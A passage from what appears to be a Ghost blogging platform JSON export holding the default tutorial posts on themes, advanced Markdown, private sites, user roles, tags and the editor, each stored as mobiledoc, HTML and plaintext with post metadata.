Like \n{{author.name}}, for example, outputs the name of the current author.\n\nThe best way to learn how to write your own Ghost theme is to have a look at \nthe\nsource code for Casper [https://github.com/TryGhost/Casper], which is heavily\ncommented and should give you a sense of how everything fits together.\n\n * default.hbs  is the main template file, all contexts will load inside this\n   file unless specifically told to use a different template.\n * post.hbs  is the file used in the context of viewing a post.\n * index.hbs  is the file used in the context of viewing the home page.\n * and so on\n\nWe've got full and extensive theme documentation\n[http://themes.ghost.org/docs/about]  which outlines every template file,\ncontext and helper that you can use.\n\nIf you want to chat with other people making Ghost themes to get any advice or\nhelp, there's also a #themes  channel in our public Slack community\n[https://slack.ghost.org]  which we always recommend joining!","feature_image":"https://casper.ghost.org/v1.0.0/images/design.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2017-09-16T06:41:39.000Z","created_by":"5951f5fca366002ebd5dbef7","updated_at":"2017-09-16T11:16:04.000Z","updated_by":"1","published_at":"2017-09-16T06:41:39.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bcc7a4045d4920c17856e3","uuid":"ac1773fd-145e-47e7-9313-f9c016936eaa","title":"Advanced Markdown tips","slug":"advanced-markdown","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"There are lots of powerful things you can do with the Ghost editor\\n\\nIf you've gotten pretty comfortable with [all the basics](/the-editor/) of writing in Ghost, then you may enjoy some more advanced tips about the types of things you can do with Markdown!\\n\\nAs with the last post about the editor, you'll want to be actually editing this post as you read it so that you can see all the Markdown code we're using.\\n\\n\\n## Special formatting\\n\\nAs well as bold and italics, you can also use some other special formatting in Markdown when the need arises, for example:\\n\\n+ ~~strike through~~\\n+ ==highlight==\\n+ \\\\*escaped characters\\\\*\\n\\n\\n## Writing code blocks\\n\\nThere are two types of code elements which can be inserted in Markdown, the first is inline, and the other is block. Inline code is formatted by wrapping any word or words in back-ticks, `like this`. Larger snippets of code can be displayed across multiple lines using triple back ticks:\\n\\n```\\n.my-link {\\n    text-decoration: underline;\\n}\\n```\\n\\nIf you want to get really fancy, you can even add syntax highlighting using [Prism.js](http://prismjs.com/).\\n\\n\\n## Full bleed images\\n\\nOne neat trick which you can use in Markdown to distinguish between different types of images is to add a `#hash` value to the end of the source URL, and then target images containing the hash with special styling. For example:\\n\\n![walking](https://casper.ghost.org/v1.0.0/images/walking.jpg#full)\\n\\nwhich is styled with...\\n\\n```\\nimg[src$=\\\"#full\\\"] {\\n    max-width: 100vw;\\n}\\n```\\n\\nThis creates full-bleed images in the Casper theme, which stretch beyond their usual boundaries right up to the edge of the window. Every theme handles these types of things slightly differently, but it's a great trick to play with if you want to have a variety of image sizes and styles.\\n\\n\\n## Reference lists\\n\\n**The quick brown [fox][1], jumped over the lazy [dog][2].**\\n\\n[1]: https://en.wikipedia.org/wiki/Fox \\\"Wikipedia: Fox\\\"\\n[2]: https://en.wikipedia.org/wiki/Dog \\\"Wikipedia: Dog\\\"\\n\\nAnother way to insert links in markdown is using reference lists. You might want to use this style of linking to cite reference material in a Wikipedia-style. All of the links are listed at the end of the document, so you can maintain full separation between content and its source or reference.\\n\\n\\n## Creating footnotes\\n\\nThe quick brown fox[^1] jumped over the lazy dog[^2].\\n\\n[^1]: Foxes are red\\n[^2]: Dogs are usually not red\\n\\nFootnotes are a great way to add additional contextual details when appropriate. Ghost will automatically add footnote content to the very end of your post.\\n\\n\\n## Full HTML\\n\\nPerhaps the best part of Markdown is that you're never limited to just Markdown. You can write HTML directly in the Ghost editor and it will just work as HTML usually does. No limits! Here's a standard YouTube embed code as an example:\\n\\n<iframe width=\\\"560\\\" height=\\\"315\\\" src=\\\"https://www.youtube.com/embed/Cniqsc9QfDo?rel=0&amp;showinfo=0\\\" frameborder=\\\"0\\\" allowfullscreen></iframe>\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>There are lots of powerful things you can do with the Ghost editor</p>\n<p>If you've gotten pretty comfortable with <a href=\"/the-editor/\">all the basics</a> of writing in Ghost, then you may enjoy some more advanced tips about the types of things you can do with Markdown!</p>\n<p>As with the last post about the editor, you'll want to be actually editing this post as you read it so that you can see all the Markdown code we're using.</p>\n<h2 id=\"specialformatting\">Special formatting</h2>\n<p>As well as bold and italics, you can also use some other special formatting in Markdown when the need arises, for example:</p>\n<ul>\n<li><s>strike through</s></li>\n<li><mark>highlight</mark></li>\n<li>*escaped characters*</li>\n</ul>\n<h2 id=\"writingcodeblocks\">Writing code blocks</h2>\n<p>There are two types of code elements which can be inserted in Markdown, the first is inline, and the other is block. Inline code is formatted by wrapping any word or words in back-ticks, <code>like this</code>. Larger snippets of code can be displayed across multiple lines using triple back ticks:</p>\n<pre><code>.my-link {\n    text-decoration: underline;\n}\n</code></pre>\n<p>If you want to get really fancy, you can even add syntax highlighting using <a href=\"http://prismjs.com/\">Prism.js</a>.</p>\n<h2 id=\"fullbleedimages\">Full bleed images</h2>\n<p>One neat trick which you can use in Markdown to distinguish between different types of images is to add a <code>#hash</code> value to the end of the source URL, and then target images containing the hash with special styling. For example:</p>\n<p><img src=\"https://casper.ghost.org/v1.0.0/images/walking.jpg#full\" alt=\"walking\"></p>\n<p>which is styled with...</p>\n<pre><code>img[src$=&quot;#full&quot;] {\n    max-width: 100vw;\n}\n</code></pre>\n<p>This creates full-bleed images in the Casper theme, which stretch beyond their usual boundaries right up to the edge of the window. Every theme handles these types of things slightly differently, but it's a great trick to play with if you want to have a variety of image sizes and styles.</p>\n<h2 id=\"referencelists\">Reference lists</h2>\n<p><strong>The quick brown <a href=\"https://en.wikipedia.org/wiki/Fox\" title=\"Wikipedia: Fox\">fox</a>, jumped over the lazy <a href=\"https://en.wikipedia.org/wiki/Dog\" title=\"Wikipedia: Dog\">dog</a>.</strong></p>\n<p>Another way to insert links in markdown is using reference lists. You might want to use this style of linking to cite reference material in a Wikipedia-style. All of the links are listed at the end of the document, so you can maintain full separation between content and its source or reference.</p>\n<h2 id=\"creatingfootnotes\">Creating footnotes</h2>\n<p>The quick brown fox<sup class=\"footnote-ref\"><a href=\"#fn1\" id=\"fnref1\">[1]</a></sup> jumped over the lazy dog<sup class=\"footnote-ref\"><a href=\"#fn2\" id=\"fnref2\">[2]</a></sup>.</p>\n<p>Footnotes are a great way to add additional contextual details when appropriate. Ghost will automatically add footnote content to the very end of your post.</p>\n<h2 id=\"fullhtml\">Full HTML</h2>\n<p>Perhaps the best part of Markdown is that you're never limited to just Markdown. You can write HTML directly in the Ghost editor and it will just work as HTML usually does. No limits! Here's a standard YouTube embed code as an example:</p>\n<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/Cniqsc9QfDo?rel=0&amp;showinfo=0\" frameborder=\"0\" allowfullscreen></iframe>\n<hr class=\"footnotes-sep\">\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p>Foxes are red <a href=\"#fnref1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n<li id=\"fn2\" class=\"footnote-item\"><p>Dogs are usually not red <a href=\"#fnref2\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</section>\n</div>","amp":null,"plaintext":"There are lots of powerful things you can do with the Ghost editor\n\nIf you've gotten pretty comfortable with all the basics [/the-editor/]  of\nwriting in Ghost, then you may enjoy some more advanced tips about the types of\nthings you can do with Markdown!\n\nAs with the last post about the editor, you'll want to be actually editing this\npost as you read it so that you can see all the Markdown code we're using.\n\nSpecial formatting\nAs well as bold and italics, you can also use some other special formatting in\nMarkdown when the need arises, for example:\n\n * strike through\n * highlight\n * *escaped characters*\n\nWriting code blocks\nThere are two types of code elements which can be inserted in Markdown, the\nfirst is inline, and the other is block. Inline code is formatted by wrapping\nany word or words in back-ticks, like this. Larger snippets of code can be\ndisplayed across multiple lines using triple back ticks:\n\n.my-link {\n    text-decoration: underline;\n}\n\n\nIf you want to get really fancy, you can even add syntax highlighting using \nPrism.js [http://prismjs.com/].\n\nFull bleed images\nOne neat trick which you can use in Markdown to distinguish between different\ntypes of images is to add a #hash  value to the end of the source URL, and then\ntarget images containing the hash with special styling. For example:\n\n\n\nwhich is styled with...\n\nimg[src$=\"#full\"] {\n    max-width: 100vw;\n}\n\n\nThis creates full-bleed images in the Casper theme, which stretch beyond their\nusual boundaries right up to the edge of the window. Every theme handles these\ntypes of things slightly differently, but it's a great trick to play with if you\nwant to have a variety of image sizes and styles.\n\nReference lists\nThe quick brown fox [https://en.wikipedia.org/wiki/Fox], jumped over the lazy \ndog [https://en.wikipedia.org/wiki/Dog].\n\nAnother way to insert links in markdown is using reference lists. You might want\nto use this style of linking to cite reference material in a Wikipedia-style.\nAll of the links are listed at the end of the document, so you can maintain full\nseparation between content and its source or reference.\n\nCreating footnotes\nThe quick brown fox[1]  jumped over the lazy dog[2].\n\nFootnotes are a great way to add additional contextual details when appropriate.\nGhost will automatically add footnote content to the very end of your post.\n\nFull HTML\nPerhaps the best part of Markdown is that you're never limited to just Markdown.\nYou can write HTML directly in the Ghost editor and it will just work as HTML\nusually does. No limits! Here's a standard YouTube embed code as an example:\n\n\n--------------------------------------------------------------------------------\n\n 1. Foxes are red ↩︎\n    \n    \n 2. Dogs are usually not red ↩︎","feature_image":"https://casper.ghost.org/v1.0.0/images/advanced.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2017-09-16T06:41:40.000Z","created_by":"5951f5fca366002ebd5dbef7","updated_at":"2017-09-16T11:15:55.000Z","updated_by":"1","published_at":"2017-09-16T06:41:40.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bcc7a4045d4920c17856e4","uuid":"67d8a1cd-cd37-4e9d-925c-ab4258a7d3e8","title":"Making your site private","slug":"private-sites","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Sometimes you might want to put your site behind closed doors\\n\\nIf you've got a publication that you don't want the world to see yet because it's not ready to launch, you can hide your Ghost site behind a simple shared pass-phrase.\\n\\nYou can toggle this preference on at the bottom of Ghost's General Settings\\n\\n![private](https://casper.ghost.org/v1.0.0/images/private.png)\\n\\nGhost will give you a short, randomly generated pass-phrase which you can share with anyone who needs access to the site while you're working on it. While this setting is enabled, all search engine optimisation features will be switched off to help keep the site off the radar.\\n\\nDo remember though, this is *not* secure authentication. You shouldn't rely on this feature for protecting important private data. It's just a simple, shared pass-phrase for very basic privacy.\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Sometimes you might want to put your site behind closed doors</p>\n<p>If you've got a publication that you don't want the world to see yet because it's not ready to launch, you can hide your Ghost site behind a simple shared pass-phrase.</p>\n<p>You can toggle this preference on at the bottom of Ghost's General Settings</p>\n<p><img src=\"https://casper.ghost.org/v1.0.0/images/private.png\" alt=\"private\"></p>\n<p>Ghost will give you a short, randomly generated pass-phrase which you can share with anyone who needs access to the site while you're working on it. While this setting is enabled, all search engine optimisation features will be switched off to help keep the site off the radar.</p>\n<p>Do remember though, this is <em>not</em> secure authentication. You shouldn't rely on this feature for protecting important private data. It's just a simple, shared pass-phrase for very basic privacy.</p>\n</div>","amp":null,"plaintext":"Sometimes you might want to put your site behind closed doors\n\nIf you've got a publication that you don't want the world to see yet because\nit's not ready to launch, you can hide your Ghost site behind a simple shared\npass-phrase.\n\nYou can toggle this preference on at the bottom of Ghost's General Settings\n\n\n\nGhost will give you a short, randomly generated pass-phrase which you can share\nwith anyone who needs access to the site while you're working on it. While this\nsetting is enabled, all search engine optimisation features will be switched off\nto help keep the site off the radar.\n\nDo remember though, this is not  secure authentication. You shouldn't rely on\nthis feature for protecting important private data. It's just a simple, shared\npass-phrase for very basic privacy.","feature_image":"https://casper.ghost.org/v1.0.0/images/locked.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2017-09-16T06:41:40.000Z","created_by":"5951f5fca366002ebd5dbef7","updated_at":"2017-09-16T11:15:44.000Z","updated_by":"1","published_at":"2017-09-16T06:41:41.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bcc7a4045d4920c17856e5","uuid":"acb633f1-7fa8-4c30-92f0-177d9c2e5056","title":"Managing Ghost users","slug":"managing-users","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Ghost has a number of different user roles for your team\\n\\n\\n### Authors\\n\\nThe base user level in Ghost is an author. Authors can write posts, edit their own posts, and publish their own posts. Authors are **trusted** users. If you don't trust users to be allowed to publish their own posts, you shouldn't invite them to Ghost admin.\\n\\n\\n### Editors\\n\\nEditors are the 2nd user level in Ghost. Editors can do everything that an Author can do, but they can also edit and publish the posts of others - as well as their own. Editors can also invite new authors to the site.\\n\\n\\n### Administrators\\n\\nThe top user level in Ghost is Administrator. Again, administrators can do everything that Authors and Editors can do, but they can also edit all site settings and data, not just content. Additionally, administrators have full access to invite, manage or remove any other user of the site.\\n\\n\\n### The Owner\\n\\nThere is only ever one owner of a Ghost site. The owner is a special user which has all the same permissions as an Administrator, but with two exceptions: The Owner can never be deleted. And in some circumstances the owner will have access to additional special settings if applicable — for example, billing details, if using Ghost(Pro).\\n\\n---\\n\\nIt's a good idea to ask all of your users to fill out their user profiles, including bio and social links. These will populate rich structured data for posts and generally create more opportunities for themes to fully populate their design. \"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Ghost has a number of different user roles for your team</p>\n<h3 id=\"authors\">Authors</h3>\n<p>The base user level in Ghost is an author. Authors can write posts, edit their own posts, and publish their own posts. Authors are <strong>trusted</strong> users. If you don't trust users to be allowed to publish their own posts, you shouldn't invite them to Ghost admin.</p>\n<h3 id=\"editors\">Editors</h3>\n<p>Editors are the 2nd user level in Ghost. Editors can do everything that an Author can do, but they can also edit and publish the posts of others - as well as their own. Editors can also invite new authors to the site.</p>\n<h3 id=\"administrators\">Administrators</h3>\n<p>The top user level in Ghost is Administrator. Again, administrators can do everything that Authors and Editors can do, but they can also edit all site settings and data, not just content. Additionally, administrators have full access to invite, manage or remove any other user of the site.</p>\n<h3 id=\"theowner\">The Owner</h3>\n<p>There is only ever one owner of a Ghost site. The owner is a special user which has all the same permissions as an Administrator, but with two exceptions: The Owner can never be deleted. And in some circumstances the owner will have access to additional special settings if applicable — for example, billing details, if using Ghost(Pro).</p>\n<hr>\n<p>It's a good idea to ask all of your users to fill out their user profiles, including bio and social links. These will populate rich structured data for posts and generally create more opportunities for themes to fully populate their design.</p>\n</div>","amp":null,"plaintext":"Ghost has a number of different user roles for your team\n\nAuthors\nThe base user level in Ghost is an author. Authors can write posts, edit their\nown posts, and publish their own posts. Authors are trusted  users. If you don't\ntrust users to be allowed to publish their own posts, you shouldn't invite them\nto Ghost admin.\n\nEditors\nEditors are the 2nd user level in Ghost. Editors can do everything that an\nAuthor can do, but they can also edit and publish the posts of others - as well\nas their own. Editors can also invite new authors to the site.\n\nAdministrators\nThe top user level in Ghost is Administrator. Again, administrators can do\neverything that Authors and Editors can do, but they can also edit all site\nsettings and data, not just content. Additionally, administrators have full\naccess to invite, manage or remove any other user of the site.\n\nThe Owner\nThere is only ever one owner of a Ghost site. The owner is a special user which\nhas all the same permissions as an Administrator, but with two exceptions: The\nOwner can never be deleted. And in some circumstances the owner will have access\nto additional special settings if applicable — for example, billing details, if\nusing Ghost(Pro).\n\n\n--------------------------------------------------------------------------------\n\nIt's a good idea to ask all of your users to fill out their user profiles,\nincluding bio and social links. These will populate rich structured data for\nposts and generally create more opportunities for themes to fully populate their\ndesign.","feature_image":"https://casper.ghost.org/v1.0.0/images/team.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2017-09-16T06:41:40.000Z","created_by":"5951f5fca366002ebd5dbef7","updated_at":"2017-09-16T11:15:36.000Z","updated_by":"1","published_at":"2017-09-16T06:41:42.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bcc7a4045d4920c17856e6","uuid":"7fe0db5f-ef28-4e21-b097-5cf2c8eec196","title":"Organising your content with tags","slug":"using-tags","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Ghost has a single, powerful organisational taxonomy, called tags.\\n\\nIt doesn't matter whether you want to call them categories, tags, boxes, or anything else. You can think of Ghost tags a lot like Gmail labels. By tagging posts with one or more keyword, you can organise articles into buckets of related content.\\n\\n\\n## Basic tagging\\n\\nWhen you write a post, you can assign tags to help differentiate between categories of content. For example, you might tag some posts with `News` and other posts with `Cycling`, which would create two distinct categories of content listed on `/tag/news/` and `/tag/cycling/`, respectively.\\n\\nIf you tag a post with both `News` *and* `Cycling` - then it appears in both sections.\\n\\nTag archives are like dedicated home-pages for each category of content that you have. They have their own pages, their own RSS feeds, and can support their own cover images and meta data.\\n\\n\\n## The primary tag\\n\\nInside the Ghost editor, you can drag and drop tags into a specific order. The first tag in the list is always given the most importance, and some themes will only display the primary tag (the first tag in the list) by default. So you can add the most important tag which you want to show up in your theme, but also add a bunch of related tags which are less important.\\n\\n==**News**, Cycling, Bart Stevens, Extreme Sports==\\n\\nIn this example, **News** is the primary tag which will be displayed by the theme, but the post will also still receive all the other tags, and show up in their respective archives.\\n\\n\\n## Private tags\\n\\nSometimes you may want to assign a post a specific tag, but you don't necessarily want that tag appearing in the theme or creating an archive page. In Ghost, hashtags are private and can be used for special styling.\\n\\nFor example, if you sometimes publish posts with video content - you might want your theme to adapt and get rid of the sidebar for these posts, to give more space for an embedded video to fill the screen. In this case, you could use private tags to tell your theme what to do.\\n\\n==**News**, Cycling, #video==\\n\\nHere, the theme would assign the post publicly displayed tags of `News`, and `Cycling` - but it would also keep a private record of the post being tagged with `#video`.\\n\\nIn your theme, you could then look for private tags conditionally and give them special formatting:\\n\\n```\\n{{#post}}\\n    {{#has tag=\\\"#video\\\"}}\\n        ...markup for a nice big video post layout...\\n    {{else}}\\n        ...regular markup for a post...\\n    {{/has}}\\n{{/post}}\\n```\\n\\nYou can find documentation for theme development techniques like this and many more over on Ghost's extensive [theme documentation](https://themes.ghost.org/).\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Ghost has a single, powerful organisational taxonomy, called tags.</p>\n<p>It doesn't matter whether you want to call them categories, tags, boxes, or anything else. You can think of Ghost tags a lot like Gmail labels. By tagging posts with one or more keyword, you can organise articles into buckets of related content.</p>\n<h2 id=\"basictagging\">Basic tagging</h2>\n<p>When you write a post, you can assign tags to help differentiate between categories of content. For example, you might tag some posts with <code>News</code> and other posts with <code>Cycling</code>, which would create two distinct categories of content listed on <code>/tag/news/</code> and <code>/tag/cycling/</code>, respectively.</p>\n<p>If you tag a post with both <code>News</code> <em>and</em> <code>Cycling</code> - then it appears in both sections.</p>\n<p>Tag archives are like dedicated home-pages for each category of content that you have. They have their own pages, their own RSS feeds, and can support their own cover images and meta data.</p>\n<h2 id=\"theprimarytag\">The primary tag</h2>\n<p>Inside the Ghost editor, you can drag and drop tags into a specific order. The first tag in the list is always given the most importance, and some themes will only display the primary tag (the first tag in the list) by default. So you can add the most important tag which you want to show up in your theme, but also add a bunch of related tags which are less important.</p>\n<p><mark><strong>News</strong>, Cycling, Bart Stevens, Extreme Sports</mark></p>\n<p>In this example, <strong>News</strong> is the primary tag which will be displayed by the theme, but the post will also still receive all the other tags, and show up in their respective archives.</p>\n<h2 id=\"privatetags\">Private tags</h2>\n<p>Sometimes you may want to assign a post a specific tag, but you don't necessarily want that tag appearing in the theme or creating an archive page. In Ghost, hashtags are private and can be used for special styling.</p>\n<p>For example, if you sometimes publish posts with video content - you might want your theme to adapt and get rid of the sidebar for these posts, to give more space for an embedded video to fill the screen. In this case, you could use private tags to tell your theme what to do.</p>\n<p><mark><strong>News</strong>, Cycling, #video</mark></p>\n<p>Here, the theme would assign the post publicly displayed tags of <code>News</code>, and <code>Cycling</code> - but it would also keep a private record of the post being tagged with <code>#video</code>.</p>\n<p>In your theme, you could then look for private tags conditionally and give them special formatting:</p>\n<pre><code>{{#post}}\n    {{#has tag=&quot;#video&quot;}}\n        ...markup for a nice big video post layout...\n    {{else}}\n        ...regular markup for a post...\n    {{/has}}\n{{/post}}\n</code></pre>\n<p>You can find documentation for theme development techniques like this and many more over on Ghost's extensive <a href=\"https://themes.ghost.org/\">theme documentation</a>.</p>\n</div>","amp":null,"plaintext":"Ghost has a single, powerful organisational taxonomy, called tags.\n\nIt doesn't matter whether you want to call them categories, tags, boxes, or\nanything else. You can think of Ghost tags a lot like Gmail labels. By tagging\nposts with one or more keyword, you can organise articles into buckets of\nrelated content.\n\nBasic tagging\nWhen you write a post, you can assign tags to help differentiate between\ncategories of content. For example, you might tag some posts with News  and\nother posts with Cycling, which would create two distinct categories of content\nlisted on /tag/news/  and /tag/cycling/, respectively.\n\nIf you tag a post with both News  and  Cycling  - then it appears in both\nsections.\n\nTag archives are like dedicated home-pages for each category of content that you\nhave. They have their own pages, their own RSS feeds, and can support their own\ncover images and meta data.\n\nThe primary tag\nInside the Ghost editor, you can drag and drop tags into a specific order. The\nfirst tag in the list is always given the most importance, and some themes will\nonly display the primary tag (the first tag in the list) by default. So you can\nadd the most important tag which you want to show up in your theme, but also add\na bunch of related tags which are less important.\n\nNews, Cycling, Bart Stevens, Extreme Sports\n\nIn this example, News  is the primary tag which will be displayed by the theme,\nbut the post will also still receive all the other tags, and show up in their\nrespective archives.\n\nPrivate tags\nSometimes you may want to assign a post a specific tag, but you don't\nnecessarily want that tag appearing in the theme or creating an archive page. In\nGhost, hashtags are private and can be used for special styling.\n\nFor example, if you sometimes publish posts with video content - you might want\nyour theme to adapt and get rid of the sidebar for these posts, to give more\nspace for an embedded video to fill the screen. In this case, you could use\nprivate tags to tell your theme what to do.\n\nNews, Cycling, #video\n\nHere, the theme would assign the post publicly displayed tags of News, and \nCycling  - but it would also keep a private record of the post being tagged with\n #video.\n\nIn your theme, you could then look for private tags conditionally and give them\nspecial formatting:\n\n{{#post}}\n    {{#has tag=\"#video\"}}\n        ...markup for a nice big video post layout...\n    {{else}}\n        ...regular markup for a post...\n    {{/has}}\n{{/post}}\n\n\nYou can find documentation for theme development techniques like this and many\nmore over on Ghost's extensive theme documentation [https://themes.ghost.org/].","feature_image":"https://casper.ghost.org/v1.0.0/images/tags.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2017-09-16T06:41:40.000Z","created_by":"5951f5fca366002ebd5dbef7","updated_at":"2017-09-16T11:15:26.000Z","updated_by":"1","published_at":"2017-09-16T06:41:43.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bcc7a4045d4920c17856e7","uuid":"f4bb5181-bbc6-49bc-9a03-e1e36370bf11","title":"Using the Ghost editor","slug":"the-editor","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Ghost uses a language called **Markdown** to format text.\\n\\nWhen you go to edit a post and see special characters and colours intertwined between the words, those are Markdown shortcuts which tell Ghost what to do with the words in your document. The biggest benefit of Markdown is that you can quickly apply formatting as you type, without needing to pause.\\n\\nAt the bottom of the editor, you'll find a toolbar with basic formatting options to help you get started as easily as possible. You'll also notice that there's a **?** icon, which contains more advanced shortcuts.\\n\\nFor now, though, let's run you through some of the basics. You'll want to make sure you're editing this post in order to see all the Markdown we've used.\\n\\n\\n## Formatting text\\n\\nThe most common shortcuts are of course, **bold** text, _italic_ text, and [hyperlinks](https://example.com). These generally make up the bulk of any document. You can type the characters out, but you can also use keyboard shortcuts.\\n\\n* `CMD/Ctrl + B` for Bold\\n* `CMD/Ctrl + I` for Italic\\n* `CMD/Ctrl + K` for a Link\\n* `CMD/Ctrl + H` for a Heading (Press multiple times for h2/h3/h4/etc)\\n\\nWith just a couple of extra characters here and there, you're well on your way to creating a beautifully formatted story.\\n\\n\\n## Inserting images\\n\\nImages in Markdown look just the same as links, except they're prefixed with an exclamation mark, like this:\\n\\n`![Image description](/path/to/image.jpg)`\\n\\n![Computer](https://casper.ghost.org/v1.0.0/images/computer.jpg)\\n\\nMost Markdown editors don't make you type this out, though. In Ghost you can click on the image icon in the toolbar at the bottom of the editor, or you can just click and drag an image from your desktop directly into the editor. Both will upload the image for you and generate the appropriate Markdown.\\n\\n_**Important Note:** Ghost does not currently have automatic image resizing, so it's always a good idea to make sure your images aren't gigantic files **before** uploading them to Ghost._\\n\\n\\n## Making lists\\n\\nLists in HTML are a formatting nightmare, but in Markdown they become an absolute breeze with just a couple of characters and a bit of smart automation. For numbered lists, just write out the numbers. For bullet lists, just use `*` or `-` or `+`. Like this:\\n\\n1. Crack the eggs over a bowl\\n2. Whisk them together\\n3. Make an omelette\\n\\nor\\n\\n- Remember to buy milk\\n- Feed the cat\\n- Come up with idea for next story\\n\\n\\n## Adding quotes\\n\\nWhen you want to pull out a particularly good excerpt in the middle of a piece, you can use `>` at the beginning of a paragraph to turn it into a Blockquote. You might've seen this formatting before in email clients.\\n\\n> A well placed quote guides a reader through a story, helping them to understand the most important points being made\\n\\nAll themes handles blockquotes slightly differently. Sometimes they'll look better kept shorter, while other times you can quote fairly hefty amounts of text and get away with it. Generally, the safest option is to use blockquotes sparingly.\\n\\n\\n## Dividing things up\\n\\nIf you're writing a piece in parts and you just feel like you need to divide a couple of sections distinctly from each other, a horizontal rule might be just what you need. Dropping `---` on a new line will create a sleek divider, anywhere you want it.\\n\\n---\\n\\nThis should get you going with the vast majority of what you need to do in the editor, but if you're still curious about more advanced tips then check out the [Advanced Markdown Guide](/advanced-markdown/) - or if you'd rather learn about how Ghost taxononomies work, we've got a overview of [how to use Ghost tags](/using-tags/).\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Ghost uses a language called <strong>Markdown</strong> to format text.</p>\n<p>When you go to edit a post and see special characters and colours intertwined between the words, those are Markdown shortcuts which tell Ghost what to do with the words in your document. The biggest benefit of Markdown is that you can quickly apply formatting as you type, without needing to pause.</p>\n<p>At the bottom of the editor, you'll find a toolbar with basic formatting options to help you get started as easily as possible. You'll also notice that there's a <strong>?</strong> icon, which contains more advanced shortcuts.</p>\n<p>For now, though, let's run you through some of the basics. You'll want to make sure you're editing this post in order to see all the Markdown we've used.</p>\n<h2 id=\"formattingtext\">Formatting text</h2>\n<p>The most common shortcuts are of course, <strong>bold</strong> text, <em>italic</em> text, and <a href=\"https://example.com\">hyperlinks</a>. These generally make up the bulk of any document. You can type the characters out, but you can also use keyboard shortcuts.</p>\n<ul>\n<li><code>CMD/Ctrl + B</code> for Bold</li>\n<li><code>CMD/Ctrl + I</code> for Italic</li>\n<li><code>CMD/Ctrl + K</code> for a Link</li>\n<li><code>CMD/Ctrl + H</code> for a Heading (Press multiple times for h2/h3/h4/etc)</li>\n</ul>\n<p>With just a couple of extra characters here and there, you're well on your way to creating a beautifully formatted story.</p>\n<h2 id=\"insertingimages\">Inserting images</h2>\n<p>Images in Markdown look just the same as links, except they're prefixed with an exclamation mark, like this:</p>\n<p><code>![Image description](/path/to/image.jpg)</code></p>\n<p><img src=\"https://casper.ghost.org/v1.0.0/images/computer.jpg\" alt=\"Computer\"></p>\n<p>Most Markdown editors don't make you type this out, though. In Ghost you can click on the image icon in the toolbar at the bottom of the editor, or you can just click and drag an image from your desktop directly into the editor. Both will upload the image for you and generate the appropriate Markdown.</p>\n<p><em><strong>Important Note:</strong> Ghost does not currently have automatic image resizing, so it's always a good idea to make sure your images aren't gigantic files <strong>before</strong> uploading them to Ghost.</em></p>\n<h2 id=\"makinglists\">Making lists</h2>\n<p>Lists in HTML are a formatting nightmare, but in Markdown they become an absolute breeze with just a couple of characters and a bit of smart automation. For numbered lists, just write out the numbers. For bullet lists, just use <code>*</code> or <code>-</code> or <code>+</code>. Like this:</p>\n<ol>\n<li>Crack the eggs over a bowl</li>\n<li>Whisk them together</li>\n<li>Make an omelette</li>\n</ol>\n<p>or</p>\n<ul>\n<li>Remember to buy milk</li>\n<li>Feed the cat</li>\n<li>Come up with idea for next story</li>\n</ul>\n<h2 id=\"addingquotes\">Adding quotes</h2>\n<p>When you want to pull out a particularly good excerpt in the middle of a piece, you can use <code>&gt;</code> at the beginning of a paragraph to turn it into a Blockquote. You might've seen this formatting before in email clients.</p>\n<blockquote>\n<p>A well placed quote guides a reader through a story, helping them to understand the most important points being made</p>\n</blockquote>\n<p>All themes handles blockquotes slightly differently. Sometimes they'll look better kept shorter, while other 